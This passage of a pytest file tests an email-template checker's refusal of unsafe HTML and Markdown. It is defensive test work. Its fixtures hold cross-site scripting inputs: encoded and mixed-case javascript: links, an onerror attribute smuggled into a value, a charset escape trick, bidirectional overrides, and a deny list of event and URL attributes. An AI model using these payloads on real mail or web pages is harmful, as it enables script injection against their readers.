    (R.NO_CONTROL, '<p\x0ctitle="x">y</p>', False),
    (R.NO_CONTROL, '<p\x0btitle="x">y</p>', False),
    (R.START_TAG, '<p title="a&b">y</p>', False),
    (R.START_TAG, '<p title="x"title="y">z</p>', False),
    (R.START_TAG, '<p/title="x">y</p>', False),
    (R.START_TAG, '<td bac\u212aground="#">x</td>', False),
    *((R.SELF_CLOSING, opening, False)
      for opening in ("<style/>", "<style />", "<STYLE/>", '<style media="all"/>', "<title/>", "<p/>",
                      '<a href="https://example.test/" />')),
    (R.END_TAG, "<p>x</p >", False),
    (R.END_TAG, '<p>x</p x="y">', False),
    (R.END_TAG, "<p>x</p/>", False),
    (R.END_TAG, "<title>x</title\t>", False),
    (R.TEMPLATE_CODE, "<{{ tag }}>x", False),
    (R.TEMPLATE_CODE, "<a{{ x }}>x</a>", False),
    (R.TEMPLATE_CODE, '<p {{ x }}="y">z</p>', False),
    (R.TEMPLATE_CODE, "<p>x</p{{ x }}>", False),
    (R.TEMPLATE_CODE, "<title>Hi</title{{ v }}><p>x</p></title>", False),
    (R.TEMPLATE_CODE, "<!--{{ x }}-->", True),
    *((R.ELEMENTS, f"<{tag}>x</{tag}>", False) for tag in OFF_THE_LIST),
    *((R.ELEMENTS, f"<p>x</p></{tag}>", False) for tag in ("frameset", "script", "svg", "template", "plaintext")),
    (R.ENDS_IN_TEXT, "<p>x</p><a", False),
    (R.ENDS_IN_TEXT, '<p>x</p><a title="x', False),
    (R.ENDS_IN_TEXT, '<p>x</p><a href="https://example.test/"', False),
    (R.ENDS_IN_TEXT, "<p>x</p><style>", False),
    (R.ENDS_IN_TEXT, "<p>x</p><title>", False),
    (R.ENDS_IN_TEXT, "<p>x</p><!--", False),
]
SPELLING_ADMITTED: list[tuple[str, bool]] = [
    ('<P TITLE="x">y</P>', False),
    ('<a\nhref="https://example.test/"\n\ttitle="{{ a }}"  class="b">x</a>', False),
    ("<td nowrap>x</td>", False),
    ('<br/><br /><hr /><img src="https://example.test/a.png" alt="" />', False),
    ("<p>AT&T, Q&A, R&D &amp; 5 &lt; 6</p>", False),
    ("<p>AT&T", False),
    ('<p title="a &amp; &lt;b&gt; &quot;c&quot;">x</p>', False),
    ("<title>{{ subject }} {{ a }}</title><style>.a{color:{{ brand.dark.text }}}</style>", False),
    ("<!doctype html><html><head><title>{{ subject }}</title></head><body>{{ x }}</body></html>", True),
    ("<!DOCTYPE html><p>x</p>", True),
]


@pytest.mark.parametrize(("rule", "html", "document"), [
    pytest.param(rule, html, document, id=f"{rule.value}-{rule.name.lower()}-{index}")
    for index, (rule, html, document) in enumerate(SPELLING_REFUSED)
])
def test_each_spelling_rule_refuses_with_its_message(rule: SpellingRule, html: str, document: bool) -> None:
    """Section 1: a form is admitted only in the strict spelling; each rule refuses with its own message."""

    refusals = check_html(html, compiled_expression(HTML_ENGINE), document=document)
    assert any(rule.message in refusal and f"(rule {rule.value})" in refusal for refusal in refusals), refusals


XHTML = (
    '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" '
    '"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">'
)
VML_BUTTON = (
    '<div><!--[if mso]><v:roundrect href="https://example.test/" arcsize="10%"><w:anchorlock/><center><![endif]-->'
    '<a href="https://example.test/">Go</a><!--[if mso]></center></v:roundrect><![endif]--></div>'
)
DECLARATION = "a layout opens with <!doctype html>, the one declaration a mail holds (rule 2)"
MESSAGES: list[tuple[str, bool, str]] = [
    ("<p>x</p><!-- note -->", False, "the comment '<!-- note -->': write a note as {# … #}, which no mail carries; a "
     "layout alone holds Outlook's comments (rule 2)"),
    ("<!-- Preheader --><p>x</p>", True, "the comment '<!-- Preheader -->': write a note as {# … #}, which no mail "
     "carries; a layout holds Outlook's <!--[if mso]>…<![endif]--> and the <!--[if !mso]><!-->…<!--<![endif]--> "
     "pair (rule 2)"),
    (XHTML + "<p>x</p>", True,
     f"the declaration '<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//…': {DECLARATION}"),
    ("<!doctype html><p>x</p>", False, f"the declaration '<!doctype html>': {DECLARATION}"),
    ("<p>x</p><!doctype html>", True, f"the declaration '<!doctype html>': {DECLARATION}"),
    ("<?php x ?>", False, "the processing instruction '<?php x ?>': a mail holds none; write a note as {# … #}, which "
     "no mail carries (rule 2)"),
    ("<![CDATA[x]]>", False, "the marked section '<![CDATA[x]]>': a mail holds none; write its text with &lt; and "
     "&amp; (rule 2)"),
    (VML_BUTTON, True, "in an Outlook comment: <v:roundrect> is Office vector markup, which a mail does not carry: a "
     "button drawn with it would need a value inside a comment, so write the button as a link (rule 7)"),
    ('<a href="https://example.test/café">x</a>', False,
     "the href of <a> holds a space or a character a link percent-encodes: write https://example.test/caf%C3%A9"),
    ("<p>x</p >", False, "the end tag '</p >': an end tag is </name> and nothing else (rule 5)"),
    *((f"<!--[if {condition}]><p>x</p><![endif]-->", True,
       f"the comment '<!--[if {condition}]><p>x</p><![endif]-->': write <!--[if mso]>…<![endif]-->: Outlook's other "
       "conditions are not admitted (rule 2)") for condition in ("gte mso 9", "mso | IE", "lte mso 11")),
    ('<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">', True,
     'the http-equiv attribute is not one a mail is written with (MAIL_ATTRIBUTES): declare the character set with '
     '<meta charset="utf-8">'),
    ('<td style="padding:0" >x</td>', False, "the tag '<td style=\"padding:0\" >', with white space before its >: a "
     "start tag is written plainly"),
]
"""Refusals that say what to write: a note, the one doctype, no vector markup, a percent-encoded link."""


@pytest.mark.parametrize(("html", "document", "message"), MESSAGES)
def test_a_refusal_says_how_to_write_the_row(html: str, document: bool, message: str) -> None:
    """Each refusal quotes what the author wrote and says what a mail holds instead."""

    refusals = check_html(html, compiled_expression(HTML_ENGINE), document=document)
    assert any(refusal.startswith(message) for refusal in refusals), refusals


def test_a_markdown_link_whose_label_and_target_are_values_is_admitted(plain: Any, kit: Any) -> None:
    """[{{ label }}]({{ link }}): the HTML writes the target before the label, and both reach the template whole."""

    del plain
    template = _mail("Hello, [{{ label }}]({{ link }}).", {"label": "x", "link": "x"}, key="tests.link")
    assert _refusals(template) == []
    rendered = _render(template, {"label": "Sign in", "link": "https://example.test/a b"}, kit)
    assert '<a href="https://example.test/a%20b"' in rendered.html and ">Sign in</a>" in rendered.html
    assert "Sign in (https://example.test/a%20b)" in rendered.plain_text


@pytest.mark.parametrize(("html", "document"), SPELLING_ADMITTED)
def test_the_strict_spelling_admits_what_every_reader_reads_alike(html: str, document: bool) -> None:
    """The case of names, the gaps between attributes, void elements' slashes and character references are free."""

    assert check_html(html, compiled_expression(HTML_ENGINE), document=document) == []


def test_a_mail_declares_one_character_set(kit: Any) -> None:
    """A layout's meta charset is utf-8, any case: under iso-2022-jp an escape in a value switched the reader's
    character set and a later value became an attribute."""

    jp = PLAIN_LAYOUT.replace("<head>", '<head><meta charset="iso-2022-jp">')
    template = _unsaved(format="html", source='<p><img alt="{{ a }}" src="https://example.test/x.png">{{ e }}'
                        '<b title="{{ d }}">Hi</b></p>', text_source="x", variables={"a": "x", "e": "x", "d": "x"},
                        layout="jp")
    refusals = TemplateWalker(saving=True).judge(
        template, _Rows(template, _unsaved("layout", "jp", source=jp, text_source=PLAIN_TEXT))).refusals
    assert refusals == ["layouts/jp: the charset of <meta> is utf-8, the one a mail is sent in"]
    utf8 = PLAIN_LAYOUT.replace("<head>", '<head><meta charset="UTF-8">')
    walk = TemplateWalker(saving=True).walk(
        template, _Rows(template, _unsaved("layout", "jp", source=utf8, text_source=PLAIN_TEXT)))
    html = walk.render({"a": "\x1b$B", "e": "\x1b(B", "d": "x src=x onerror=alert(1) y"}, kit=kit).html
    assert "\x1b" not in html and 'alt="$B"' in html


def test_a_value_drops_its_control_characters(plain: Any, kit: Any) -> None:
    """prepare() drops the C0 and C1 controls but tab, newline and return from every string, as a subject does; a
    value of controls alone is empty."""

    del plain
    template = _mail("<p>{{ s }}|{% if t %}T{% else %}empty{% endif %}|{{ u }}</p>", {"s": "x", "t": "x", "u": "x"},
                     format="html", text_source="{{ s }}|{{ t }}|{{ u }}", subject="{{ s }}")
    rendered = _render(template, {"s": "a\x1b$B\x00b\x07\x85c\x9f", "t": "\x00\x1b\x0c", "u": "a\tb\nc\rd"}, kit)
    assert "<p>a$Bbc|empty|a\tb\nc\rd</p>" in rendered.html
    assert rendered.plain_text.startswith("a$Bbc||a\tb\nc\rd")
    assert rendered.subject == "a$Bbc"


def test_a_value_drops_bidirectional_overrides_and_keeps_its_marks(plain: Any, kit: Any) -> None:
    """An override or an isolate in a value would reorder the author's text after it: dropped by the one rule a
    subject uses; the right-to-left and left-to-right marks a language needs stay."""

    del plain
    template = _mail("<p>{{ name }} wrote this.</p>", {"name": "x"}, format="html", text_source="{{ name }} wrote")
    rendered = _render(template, {"name": "a\u202eevil\u202c\u2066x\u2069\u200fb\u200e\u061c"}, kit)
    assert "<p>aevilx\u200fb\u200e\u061c wrote this.</p>" in rendered.html
    assert rendered.plain_text.startswith("aevilx\u200fb\u200e\u061c wrote")


def test_a_row_holds_no_control_character_and_a_return_is_a_newline(plain: Any) -> None:
    """Rule 1 for every text column: no control character but tab and newline. clean() writes a carriage return as a
    newline first, so pasted text has the content hash of the same text written with newlines."""

    del plain
    for character in ("\x00", "\x1b", "\x0c", "\x0b", "\x85", "\r", "\x7f"):
        for column in ("source", "text_source", "subject", "preheader"):
            row = _unsaved(format="html", **{"source": "<p>x</p>", "text_source": "x", column: f"a{character}b"})
            assert any(R.NO_CONTROL.message in refusal for refusal in _refusals(row)), (character, column)
    pasted = _unsaved(source="Line one\r\nLine two\rThree", subject="Hi\r\nthere", key="tests.pasted")
    written = _unsaved(source="Line one\nLine two\nThree", subject="Hi\nthere", key="tests.pasted")
    with system_context(reason="tests.messaging_templates.render.clean"):
        pasted.full_clean()
    assert (pasted.source, pasted.subject) == (written.source, written.subject)
    assert pasted.compute_content_hash() == written.compute_content_hash()


def test_a_mail_is_written_with_its_own_elements_and_attributes() -> None:
    """Rule 7 and the attribute list: each listed element and attribute is admitted, and every other is refused by
    name with one message, an Office setting admitted inside a layout's Outlook comment alone."""

    expression = compiled_expression(HTML_ENGINE)
    for tag in sorted(MAIL_ELEMENTS):
        form = f"<{tag}>" if tag in VOID_ELEMENTS else f"<{tag}>x</{tag}>"
        assert check_html(form, expression) == [], tag
        assert check_html(f"<p>x</p></{tag}>", expression) == [], tag  # an end tag is held to the list too
    values = {"href": "https://example.test/", "src": "https://example.test/a.png", "background": "#",
              "cite": "https://example.test/", "charset": "utf-8"}
    for name in sorted(MAIL_ATTRIBUTES):
        tag = sorted(LINK_ATTRIBUTES[name])[0] if name in LINK_ATTRIBUTES else "p"
        assert check_html(f'<{tag} {name}="{values.get(name, "x")}">x</{tag}>', expression) == [], name
    for name in ("onclick", "onerror", "http-equiv", "srcset", "srcdoc", "formaction", "ping", "longdesc", "data",
                 "data-x", "poster", "action", "popover", "xlink:href", "usemap", "is"):
        refusals = check_html(f'<p {name}="x">x</p>', expression)
        assert len(refusals) == 1 and refusals[0].startswith(
            f"the {name} attribute is not one a mail is written with (MAIL_ATTRIBUTES)"), refusals
    office = "<!--[if mso]><xml><o:OfficeDocumentSettings><o:AllowPNG/><o:PixelsPerInch>96</o:PixelsPerInch>" \
             "</o:OfficeDocumentSettings></xml><![endif]-->"
    assert check_html(office, expression, document=True) == []
    assert check_html(office.replace("xml>", "xmp>"), expression, document=True) != []


def test_dir_and_lang_take_the_engines_own_outputs_alone() -> None:
    """A value may not set the direction or the language of an author's element: dir, lang and xml:lang take
    {{ dir }} and {{ lang }}, a static value or a condition choosing one."""

    expression = compiled_expression(HTML_ENGINE)
    for admitted in ('<p dir="{{ dir }}" lang="{{ lang }}" xml:lang="{{ lang }}">x</p>', '<p dir="rtl">x</p>',
                     '<td dir="{% if dir == \'rtl\' %}rtl{% else %}ltr{% endif %}">x</td>'):
        assert check_html(admitted, expression) == [], admitted
    for name in ("dir", "lang", "xml:lang"):
        refusals = check_html(f'<p {name}="{{{{ v }}}}">x</p>', expression)
        assert refusals == [f"{{{{ v }}}} in the {name} attribute of <p>"], refusals
    assert check_html('<p dir="{{ lang }}">x</p>', expression) == ["{{ lang }} in the dir attribute of <p>"]


def test_a_title_holds_outputs_and_comments_only() -> None:
    """An if in a title let a value's truthiness leave out </title>, so the rest of the mail, the layout's footer and
    its stop link among it, became window-title text: refused; outputs and notes stay."""

    expression = compiled_expression(HTML_ENGINE)
    assert check_html("<title>{% if v %}</title>{% endif %}<p>{{ w }}</p>", expression) == [
        "{% if %} in a <title> element"]
    assert check_html("<title>{{ subject }}{# a note #} {{ name|upper }}</title>", expression) == []


def test_a_self_closing_style_is_refused_by_rule_4(plain: Any) -> None:
    """A browser ignores the slash of <style/>, so what follows is CSS: in a template, a block, a layout."""

    del plain
    for row in (
        _unsaved(format="html", source="<p>Hi</p><style/><p>Hello {{ name }}, welcome.</p></style>",
                 text_source="{{ name }}", variables={"name": "x"}),
        _unsaved("block", "styled", source="<p>Hi</p><style/>", text_source="Hi"),
        _unsaved("layout", "styled", source=PLAIN_LAYOUT.replace("</head>", "<style/></head>"), text_source=PLAIN_TEXT),
    ):
        refusals = _refusals(row)
        assert any(R.SELF_CLOSING.message in refusal for refusal in refusals), (row.kind, refusals)


def test_template_code_glued_to_an_end_tag_is_refused_by_rule_6(plain: Any) -> None:
    """</title{{ v }}> is title text to html.parser and an end tag to a browser once a value supplies its end."""

    del plain
    row = _unsaved(format="html", text_source="x", variables={"v": "x", "w": "x"},
                   source='<title>Hi</title{{ v }}><img alt={{ w }} src="https://example.test/x.png"></title><p>B</p>')
    assert any(R.TEMPLATE_CODE.message in refusal for refusal in _refusals(row)), _refusals(row)


def test_a_literal_nul_is_refused_by_rule_1_before_anything_reads_it(
    plain: Any, kit: Any, caplog: pytest.LogCaptureFixture,
) -> None:
    """A NUL forged the checks' placeholders: it hid a value from the style check and raised IndexError."""

    del plain
    stores_nul = connection.vendor != "postgresql"  # PostgreSQL's text columns refuse a NUL: no write stores one
    for source in ('<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ name }}">y</p>',
                   '<p title="\x009\x00">x</p>'):
        row = _unsaved(format="html", source=source, text_source="x", variables={"name": "x"})
        assert any(R.NO_CONTROL.message in refusal for refusal in _refusals(row)), source
        if not stores_nul:
            continue
        saved = _mail(source, {"name": "x"}, format="html", text_source="x", key="tests.nul")
        with pytest.raises(ValidationError, match="no control character"):
            _render(saved, {"name": "x"}, kit)
        with system_context(reason="tests.messaging_templates.render.nul"):
            assert saved.preview(kit=kit).rendered is None
            saved.delete()
    if not stores_nul:
        return
    _row("layout", "shipped", is_baseline=True)
    shipped = _row("part", "said", format="html", source="<b>Said.</b>", text_source="Said.", is_baseline=True)
    template = _row("template", "tests.said", source='{% include "parts/said" only %}', layout="shipped",
                    is_baseline=True)
    with system_context(reason="tests.messaging_templates.render.nul"):
        override = MessageTemplate.objects.override(shipped)
        override.source = '<p title="\x009\x00">x</p>'
        override.save()  # past clean: the deployment's row holds a NUL
        with caplog.at_level(logging.WARNING, logger="angee.messaging_templates.models"):
            MessageTemplate.after_resource_load([template], tier="install", source="tests")
    assert any("no control character" in record.getMessage() for record in caplog.records)


@pytest.mark.parametrize(
    ("ending", "refused"),
    [
        ("<a", True), ('<a href="https://example.test/"', True), ('<a title="x', True), ("<a href=", True),
        ("<style>", True), ("<style>.a{", True), ("<title>", True), ("<!--", True), ("<!", True), ("</", True),
        ("&am", False), ("AT&T", False), ("Q&A", False), ("5 <", True), ("<b><i>", False), ("", False),
    ],
)
def test_a_form_ends_where_it_started(ending: str, refused: bool) -> None:
    """S2 (i3): html.parser drops an unfinished tag at the end and never closes <style>; a form ends in text."""

    refusals = check_html("<p>x</p>" + ending, compiled_expression(HTML_ENGINE))
    assert bool(refusals) is refused, refusals


def test_a_row_cannot_leave_the_next_row_inside_a_tag_or_a_style(plain: Any, kit: Any) -> None:
    """S2 (a1, a2): a block ending inside a tag or a <style> is refused, so no template's value lands there."""

    del plain
    continuations = {
        "open_a": ("<p>Hi</p><a", ' href="{{ link }}" style="background:url({{ link }})">Open</a>'),
        "open_attribute": ('<p>Hi</p><a title="x"', ' href="{{ link }}">Open</a>'),
        "open_quote": ('<p>Hi</p><a title="x', '" href="{{ link }}">Open</a>'),
        "open_style": ("<p>Hi</p><style>", "Hello {{ link }}, welcome."),
    }
    for key, (ending, continuation) in continuations.items():
        assert any("it ends inside" in refusal for refusal in _refusals(_unsaved(
            "block", key, source=ending, text_source="x"))), key
        _row("block", key, source=ending, text_source="x")  # past clean, as a write that skipped the walk
        template = _mail(f'{{% include "blocks/{key}" only %}}{continuation}', {"link": "x"}, format="html",
                         text_source="{{ link }}", key=f"tests.{key}")
        with pytest.raises(ValidationError, match="it ends inside"):
            _render(template, {"link": "javascript:alert(document.domain)"}, kit)


def test_a_static_link_is_absolute_or_a_fragment_or_a_cid_image() -> None:
    """An author's link: what url leaves unchanged, a #fragment or a cid: image; a space or a character outside
    ASCII is refused with the percent-encoded link to write."""

    expression = compiled_expression(HTML_ENGINE)
    for link in ("https://example.test/a?b=1&amp;c=2", "mailto:a@example.test", "tel:+1", "#", "#top", "cid:logo",
                 "HTTPS://EXAMPLE.TEST/", "sms:+15550100?body=Hi%20there", "webcal://example.test/c.ics"):
        assert check_html(f'<a href="{link}">x</a>', expression) == [], link
    for link in ("//example.test/", "/settings", "settings", "ms-msdt:/id", "cid:a b", "#a b"):
        assert check_html(f'<a href="{link}">x</a>', expression) == [
            "the href of <a> is not a link a mail may carry: an absolute https, http, mailto or tel link, "
            "a #fragment, a cid: image, or an sms: or webcal: link"], link
    assert check_html('<a href="https://example.test/café">x</a>', expression) == [
        "the href of <a> holds a space or a character a link percent-encodes: write https://example.test/caf%C3%A9"]
    assert check_html('<a href="mailto:a@example.test?subject=Hi there">x</a>', expression) == [
        "the href of <a> holds a space or a character a link percent-encodes: write "
        "mailto:a@example.test?subject=Hi%20there"]


def test_link_attributes_follow_url_and_text_attributes_are_text() -> None:
    """URL-valued attributes: the ones mail links with follow url; the others are refused by name; text is text."""

    expression = compiled_expression(HTML_ENGINE)
    for name, elements in LINK_ATTRIBUTES.items():
        tag = sorted(elements)[0]
        for value in ("javascript:alert(1)", "JaVaScRiPt:x", "java&#9;script:x", "data:text/html,x"):
            assert check_html(f'<{tag} {name}="{value}">x</{tag}>', expression), (name, value)
        assert check_html(f'<{tag} {name}="https://example.test/a.png">x</{tag}>', expression) == [], name
        assert check_html(f'<p {name}="https://example.test/">x</p>', expression) == [
            f"the {name} attribute links on <{'>, <'.join(sorted(elements))}> alone"], name
    for name in ("ping", "longdesc", "lowsrc", "dynsrc", "usemap", "data", "codebase", "archive", "manifest",
                 "profile", "formaction", "srcset", "icon", "xlink:href", "poster", "action"):
        assert any(f"the {name} attribute is not one a mail" in refusal for refusal in check_html(
            f'<img {name}="https://example.test/">', expression)), name
    # A scheme an author splices from branches has nowhere left to go: each URL attribute is listed.
    assert check_html('<img longdesc="{% if a %}java{% else %}x{% endif %}script:alert(1)" alt="a">', expression)
    for admitted in ('<img alt="Data: 2026 results">', '<p title="File: Q3 report.pdf">x</p>',
                     '<img alt="JavaScript: The Good Parts">', '<p title="Note: hello">x</p>',
                     '<html xmlns:v="urn:schemas-microsoft-com:vml">', '<p class="sm:hidden">x</p>',
                     '<p style="color:red;background:#fff">x</p>',
                     '<meta content="width=device-width, initial-scale=1">'):
        assert check_html(admitted, expression) == [], admitted


OUTLOOK_DPI = (
    "<!--[if mso]><xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings>"
    "</xml><![endif]-->"
)
GHOST = (
    '<!--[if mso]><table role="presentation" width="600" align="center"><tr><td><![endif]-->'
    "<table><tr><td>{{ x }}</td></tr></table><!--[if mso]></td></tr></table><![endif]-->"
)


@pytest.mark.parametrize(
    ("html", "refused"),
    [
        pytest.param(OUTLOOK_DPI, False, id="dpi"),
        pytest.param("<!--[if mso]><style>td{font-family:Arial,sans-serif !important}</style><![endif]-->", False,
                     id="font-override"),
        pytest.param(GHOST, False, id="ghost-table"),
        pytest.param("<!--[if !mso]><!--><p>{{ x }}</p><!--<![endif]-->", False, id="revealed-pair"),
        pytest.param("<!--[if mso]><b>{{ x }}</b><![endif]-->", True, id="template-code-inside"),
        pytest.param("<!--[if mso]><!-- {{ x }} --><![endif]-->", True, id="template-code-in-a-nested-comment"),
        pytest.param("<!-- note -->", True, id="plain-comment"),
        pytest.param("<!--[if gte mso 9]><b>x</b><![endif]-->", True, id="other-condition"),
        pytest.param("<!--[if mso]><v:roundrect></v:roundrect><![endif]-->", True, id="vml-button"),
        pytest.param("<!--[if mso]><script>x</script><![endif]-->", True, id="script-inside"),
        pytest.param('<!--[if mso]><p onclick="x">x</p><![endif]-->', True, id="event-inside"),
        pytest.param('<!--[if mso]><a href="javascript:x">x</a><![endif]-->', True, id="link-inside"),
        pytest.param('<!--[if mso]><a href="x<![endif]-->', True, id="ends-inside-a-tag"),
        pytest.param("<!--[if mso]><style>td{<![endif]-->", True, id="ends-inside-style"),
        pytest.param("<!--[if mso]><b>--!><p>x</p><![endif]-->", True, id="bang-close"),
        pytest.param("</<![endif]>", True, id="bogus-close"),
        pytest.param("<!--[if !mso]><!--><p>x</p>", True, id="revealed-unclosed"),
        pytest.param("<p>x</p><!--<![endif]-->", True, id="revealed-unopened"),
        pytest.param("<!--[if !mso]><!--><!--[if !mso]><!--><!--<![endif]--><!--<![endif]-->", True,
                     id="revealed-nested"),
        pytest.param("<!--[if !mso]><!-->" + OUTLOOK_DPI + "<!--<![endif]-->", True, id="mso-inside-revealed"),
    ],
)
def test_a_layout_holds_outlooks_conditional_comments_alone(html: str, refused: bool) -> None:
    """D2: a layout may carry static, balanced MSO conditional comments whose markup is checked as any other."""

    assert bool(check_html(html, compiled_expression(HTML_ENGINE), document=True)) is refused, check_html(
        html, compiled_expression(HTML_ENGINE), document=True)
    assert check_html(html, compiled_expression(HTML_ENGINE)) or "<!--" not in html


def test_only_a_layout_carries_outlooks_comments(plain: Any) -> None:
    """D2: the kind's fact decides; a template, block or part carrying one is refused."""

    del plain
    assert _refusals(_unsaved("layout", "outlook", source=OUTLOOK_DPI + PLAIN_LAYOUT, text_source=PLAIN_TEXT)) == []
    for row in (_unsaved(format="html", source=OUTLOOK_DPI, text_source="x"),
                _unsaved("block", "outlook", source=OUTLOOK_DPI, text_source="x")):
        assert any("a layout alone holds Outlook's comments" in refusal for refusal in _refusals(row)), row.kind


def test_static_url_as_decoded() -> None:
    """A static link is judged as a browser follows it: html.parser decodes the entities first (q12)."""

    for href in ("javascript&#58;alert(1)", "javascript&colon;alert(1)", "java&#x09;script:alert(1)",
                 "&#x6A;avascript:alert(1)"):
        assert check_html(f'<a href="{href}">x</a>', compiled_expression(HTML_ENGINE)), href
    assert check_html('<a href="https://example.test/">x</a>', compiled_expression(HTML_ENGINE)) == []


def test_if_splice_refused(plain: Any) -> None:
    """An if whose ends sit in attributes of different elements would join them when false (q16)."""

    del plain
    source = ('<meta name="x" content="{% if x %}"><p>hidden</p>'
              '<b title="{% endif %}" lang="en">t</b>')
    assert any("whole tag pair" in message for message in _refusals(_unsaved(
        format="html", text_source="x", source=source, variables={"x": "x"})))


# ---------- the Markdown pass ----------


@pytest.mark.parametrize(
    ("source", "refusal"),
    [
        pytest.param("Use `{{ name }}` here.", "code inline", id="span-in-code-span"),
        pytest.param("`{% if a %}`\n\n- item\n- `{% endif %}`\n", "code inline", id="pair-torn-through-code"),
        pytest.param("{% if a %}\n\n```\n{% endif %}\n```\n", "fence", id="fenced-code-holds-endif"),
        pytest.param("{% if a %}\n\nText\n\n    {% endif %}\n", "code block", id="indented-code-holds-endif"),
        pytest.param("```{%endif%}\nx\n```\n", "fence", id="fence-info"),
        pytest.param('[x](https://example.test "{{ name }}")', "link open", id="link-title"),
        pytest.param("Write &#123;&#123; to show braces.", "text holds {{", id="entity-braces"),
        pytest.param("Write &#123;&#123; name &#125;&#125; here.", "does not reach the template whole",
                     id="entity-span"),
        pytest.param("Write \\{\\{ name \\}\\} here.", "does not reach the template whole", id="backslash-braces"),
        pytest.param('`{% include "parts/p" only %}`', "code inline", id="code-span-with-quotes"),
        pytest.param("![logo]({{ name }})", "an image's source is an output", id="image-of-an-output"),
        pytest.param("{% for i in items %}\n- {{ i }}\n{% endfor %}", "different Markdown blocks",
                     id="list-swallows-endfor"),
        pytest.param("Intro {% if a %} for VIPs\n\n## Heading {% endif %}", "different Markdown blocks",
                     id="paragraph-to-heading"),
        pytest.param('Hi {% include "parts/p" only %}', "not alone in its paragraph", id="include-inline"),
    ],
)
def test_markdown_code_tokens(plain: Any, source: str, refusal: str) -> None:
    """Template code reaches the engine only as a span of its own, kept whole (p4, q13)."""

    del plain
    _row("part", "p", source="P.")
    refusals = _refusals(_unsaved(source=source, variables={"name": "x", "a": "x", "items.*": "x"}))
    assert any(refusal in message for message in refusals), refusals


def test_markdown_spans_reach_the_engine_whole(plain: Any, kit: Any) -> None:
    """Property 7: quotes, comparison signs and filter arguments survive the Markdown pass."""

    del plain
    template = _mail(
        "{% if count > 2 and name != 'Bo' %}Many{% endif %} **{{ name|truncatechars:3 }}** "
        "[Open]({{ link }}) {% templatetag openvariable %} {# note #}\n\n"
        "{% comment %}\n\n# Hidden {{ name }}\n\n{% endcomment %}\n\nShown",
        {"count": "x", "name": "x", "link": "x"},
    )
    rendered = _render(template, {"count": 3, "name": "Ana Lima", "link": "https://example.test/a?b=1&c=2"}, kit)
    assert "Many <strong>An…</strong>" in rendered.html
    assert 'href="https://example.test/a?b=1&amp;c=2"' in rendered.html
    assert "{{" in rendered.html and "Hidden" not in rendered.html and "<p style=\"margin:0 0 16px\">Shown</p>" in (
        rendered.html)
    assert "Many An… Open (https://example.test/a?b=1&c=2) {{" in rendered.plain_text


def test_the_plain_text_form_is_written_from_the_markdown(plain: Any, kit: Any) -> None:
    """The plain-text body comes from the Markdown tokens: links as ``label (url)``, items, quotes, code."""

    del plain
    template = _mail(
        "# Title\n\nSome *text*, a [link](https://example.test/a) and [mine]({{ link }}).\n\n"
        "{% if link %}\n\n- one\n- two\n\n{% endif %}\n\n1. first\n2. second\n\n> quoted\n> line\n\n    code\n",
        {"link": "x"},
    )
    rendered = _render(template, {"link": "https://example.test/b"}, kit)
    assert rendered.plain_text == (
        "Title\n\nSome text, a link (https://example.test/a) and mine (https://example.test/b).\n\n"
        "- one\n- two\n\n1. first\n2. second\n\n> quoted\n> line\n\ncode\n"
    )
    assert "<h1" in rendered.html and "<ol" in rendered.html and "<blockquote" in rendered.html


def test_reference_definitions_off(plain: Any) -> None:
    """A link reference definition is text, never expanded at each use (q3), and entities count in the form (q3b)."""

    del plain
    title = ("{{" * 30 + "x" * 1_000)[:980]
    source = f'[r]: /u "{title}"\n\n' + "\n".join(["[r]" * 30] * 40)
    with _within(0.5):
        refusals = _refusals(_unsaved(source=source))
        assert any("opens no template code" in message for message in refusals), refusals
        assert not any("form holds over 60" in message for message in refusals), refusals
    with system_context(reason="tests.messaging_templates.render.forms"):
        forms = TemplateWalker().check(_unsaved(source="[r]: /u\n\n[r] and [r]")).forms
    assert forms is not None and "<a" not in forms.html and "[r]: /u" in forms.html


def test_values_never_become_markdown(plain: Any, kit: Any) -> None:
    """Property 2: a value is one token to the Markdown pass; raw HTML in the source is text."""

    del plain
    template = _mail("Hello {{ name }}, welcome. Hi <b onclick=x>there</b>", {"name": "x"})
    value = "[Win](https://evil.example) **x** <b>y</b>\n\n# Urgent"
    rendered = _render(template, {"name": value}, kit)
    assert "evil.example</a>" not in rendered.html and "<strong>" not in rendered.html and "<h1" not in rendered.html
    assert "&lt;b&gt;y&lt;/b&gt;" in rendered.html and "&lt;b onclick=x&gt;there&lt;/b&gt;" in rendered.html
    assert value in rendered.plain_text
    assert any("does not compile" in message for message in _refusals(_unsaved(
        source="{% verbatim %}{{ x }}{% endverbatim %}")))


# ---------- values ----------


@functools.lru_cache(maxsize=4_096)
def _reading(html: str, *, scripting: bool) -> tuple[list[tuple[Any, ...]], list[str]]:
    """What a browser reads of a rendered body, by html5lib's WHATWG tokeniser and tree construction.

    The elements in document order with their attributes, and the comments; then the text of every ``style`` and
    ``script`` element. ``scripting`` reads ``noscript`` as a browser with scripting on or off does. Independent of
    the ``html.parser`` the HTML checks are built on, so a difference between the two is what it finds. The whole
    document is read, what lies before and after its ``html`` element too, and from its bytes in the character set
    it declares, as a browser reads a mail sent without one.
    """

    root = html5lib.HTMLParser(
        tree=html5lib.getTreeBuilder("etree", fullTree=True), namespaceHTMLElements=False,
    ).parse(html.encode(), scripting=scripting, likely_encoding="utf-8", useChardet=False)
    markup: list[tuple[Any, ...]] = []
    raw: list[str] = []
    for element in root.iter():
        if not isinstance(element.tag, str):
            markup.append(("comment", element.text))
        elif element.tag != "br" or element.attrib:  # linebreaksbr writes a bare <br> after escaping, as it may
            markup.append(("start", element.tag, tuple(element.attrib.items())))
            if element.tag in ("style", "script"):
                raw.append(element.text or "")
    return markup, raw


MARKER = "https://example.test/MARKER"
"""Visible text that is also a link ``url`` keeps, so a harmless value renders wherever a row prints its value."""
_HTML_SPACE = " \t\n\f\r"


def _harmless(value: str) -> str:
    """The harmless value a hostile ``value`` is compared with: of its kind, empty, HTML white space, or visible text.

    A value of control characters alone is empty once :meth:`TemplateWalk.prepare` drops them. An author's
    ``{% if v %}`` chooses author markup by a value's truthiness, and a browser's tree builder implies
    or clones author elements by whether text is present and whether it is white space (a stray ``</p>`` before the
    body, text in a table, a formatting element reopened). Neither makes a value markup, so values are compared
